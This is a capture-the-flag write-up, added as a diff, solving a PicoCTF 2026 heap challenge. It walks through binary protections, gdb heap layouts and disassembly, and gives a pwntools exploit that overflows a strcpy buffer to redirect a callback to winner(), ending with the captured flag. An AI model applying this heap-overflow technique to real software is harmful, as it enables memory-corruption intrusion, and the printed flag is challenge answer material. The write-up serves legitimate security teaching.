@@ -1,0 +1,189 @@
+====== HEAP HAVOC =======
+
+Now we'll solve the task from PicoCTF 2026 about simple heap exploitation.
+
+First of all, let's check common protections :
+
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+
+So, we haven't PIE => we already know addresses of key-sections of our binary (.plt & .got & .text & other)
+Partial RELRO => GOT owerwrite? & No canary found => stack overflow? 
+Let's figure it out in order.
+
+We even have the source code. It makes solution little easier. 
+If we look at the source we'll find the "winner()" function which reads the flag and give it to us.
+So, this task turn into the definitely heap exploitation. 
+ 
+Look at this part :
+
+ 33 int main(int argc, char **argv) {					<== command-string arguments required
+ 34     struct internet *i1, *i2, *i3;
+ 35     printf("Enter two names separated by space:\n");
+ 36     fflush(stdout);
+ 37     if (argc != 3) {
+ 38         printf("Usage: ./vuln <name1> <name2>\n", argv[0]);
+ 39         fflush(stdout);
+ 40         return 1;
+ 41     }
+
+it means that we can control length of input data
+
+Next, look at this part : 
+
+ 43 i1 = malloc(sizeof(struct internet));
+ 44 i1->priority = 1;
+ 45 i1->name = malloc(8);
+ 46 i1->callback = NULL;
+ 47 
+ 48 i2 = malloc(sizeof(struct internet));
+ 49 i2->priority = 2;
+ 50 i2->name = malloc(8);
+ 51 i2->callback = NULL;
+ 52 
+ 53 strcpy(i1->name, argv[1]);
+ 54 strcpy(i2->name, argv[2]);
+
+Just initialization of our structures, however it has critical vulnerability at the 53-54 strings
+
+This is a part of strcpy(char* dst, char* src) manual : 
+
+This function copies the string pointed to by src, into a string at the buffer pointed to by dst.
+              The programmer is responsible for allocating a destination buffer large enough, that is, strlen(src)
+              + 1.  For the difference between the two functions, see RETURN VALUE.
+              
+But in the our source code checking of the input length wasn't realized. It means that we can make the heap overflow to rewrite neighbour chunks to i1->callback or i2->callback point to winner().
+
+According glibc allocator chunks in the heap memory are located under each other : 
+
+i1 struct
+i1 name
+i2 struct
+i2 name
+
+and if we control i1 name (at the 53th string) we'll can control (aka rewrite) i2 struct with it's field "callback()"
+
+Let's check it in gdb with gef framework : 
+
+gdb --args ./vuln sayhi saybye
+
+0x804d5e0:      0x0000000000000000      0x0000001100000000	
+0x804d5f0:      0x0804d60000000001      0x0000001100000000
+0x804d600:      0x0000006968796173      0x0000001100000000
+0x804d610:      0x0804d62000000002      0x0000001100000000
+0x804d620:      0x0000657962796173      0x000219d900000000
+
+0x00000011 == size with PREV_INUSE flag & prev_size fields are empty (because PREV_INUSE)
+0x0804d600 and 0x0804d6200 are heap's addresses with strings
+0x0000006968796173 == "sayhi\0"
+0x0000657962796173 == "saybye\0"
+
+So, in our interest to change 0x0000001100000000 <== last dword to "winner()" address.
+Without PIE it isn't too hard. Just look at the binary : 
+
+080492b6 <winner>:
+ 80492b6:       f3 0f 1e fb             endbr32
+ 80492ba:       55                      push   ebp
+ 80492bb:       89 e5                   mov    ebp,esp
+ 80492bd:       53                      push   ebx
+...
+
+0x080492b6 is our target address to put it into the 0x804d618 address with help of strcpy(). It hasn't zeros in address so we can don't worry about zero-termitation at strcpy()
+
+But! When we just put to heap 24 random bytes of padding we'll get a segfault, because 2nd strcpy won't have valid destination address.
+
+0x804d5e0:      0x0000000000000000      0x0000001100000000	
+0x804d5f0:      0x0804d60000000001      0x0000001100000000
+0x804d600:      0x6161616161616161      0x6161616161616161
+0x804d610:      0x6161616161616161      0x00000011080492b6
+0x804d620:      0x0000657962796173      0x000219d900000000
+
+Trouble at 0x804d614. We also need to have valid destination address like at the 1st strcpy(). So, we can just find .data section address at the our binary 
+
+Disassembly of section .data:
+
+0804c038 <__data_start>:
+ 804c038:       00 00                   add    BYTE PTR [eax],al
+        ...
+
+0804c03c <__dso_handle>:
+ 804c03c:       00 00                   add    BYTE PTR [eax],al
+        ...
+        
+And ghidra dump :
+
+                             //
+                             // .data
+                             // SHT_PROGBITS  [0x804c038 - 0x804c03f]
+                             // ram:0804c038-ram:0804c03f
+                             //
+                             __data_start                                    XREF[2]:     Entry Point(*), 
+                             data_start                                                   _elfSectionHeaders::000003f4(*)  
+        0804c038 00              ??         00h
+        0804c039 00              ??         00h
+        0804c03a 00              ??         00h
+        0804c03b 00              ??         00h
+
+Perfect. We have 4 bytes of space at 0x0804c038
+After exploitation our heap layout well be :
+
+0x804d5e0:      0x0000000000000000      0x0000001100000000	
+0x804d5f0:      0x0804d60000000001      0x0000001100000000
+0x804d600:      0x6161616161616161      0x6161616161616161
+0x804d610:      0x0804c03861616161      0x00000011080492b6
+0x804d620:      0x0000657962796173      0x000219d900000000
+
+======== EXPLOIT WRITING =========
+
+1. Parse our binary to find winner() addr & __data_start addr : 
+
+  8 elf = ELF('./vuln')
+  9 winner = elf.symbols['winner']
+ 10 valid_dst = elf.symbols['__data_start']
+
+2. With parsed data assembly payload
+
+ 12 padding = b'a' * 20
+ 19 payload = padding + p32(valid_dst) + p32(winner) + b' sayhi'
+
+3. Open connection and lauch the trigger : 
+
+ 26 r = remote(host, port)
+ 27 
+ 28 r.recvuntil(b':')
+ 29 r.sendline(payload)
+ 
+4. Get flag : 
+
+ 31 r.recvuntil(b"FLAG:")
+ 34 
+ 35 flag = r.recvline().decode().strip()
+ 36 
+ 37 print(f'\033[33m[+] Flag : {flag}\033[0m')
+ 38 
+ 39 r.close()
+
+Output : 
+
+[*] '/home/sayhi/Desktop/ctf/pico/hard/heap-havoc/vuln'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Winner address : 0x80492b6
+[+] Valid destination : 0x804c038
+[+] Payload assembled : b'aaaaaaaaaaaaaaaaaaaa8\xc0\x04\x08\xb6\x92\x04\x08 sayhi'
+[+] Payload length : 34
+[+] Opening connection to foggy-cliff.picoctf.net on port 53002: Done
+[+] Flag : picoCTF{h34p_0v3rfl0w_68ab20d4}
+[*] Closed connection to foggy-cliff.picoctf.net port 53002
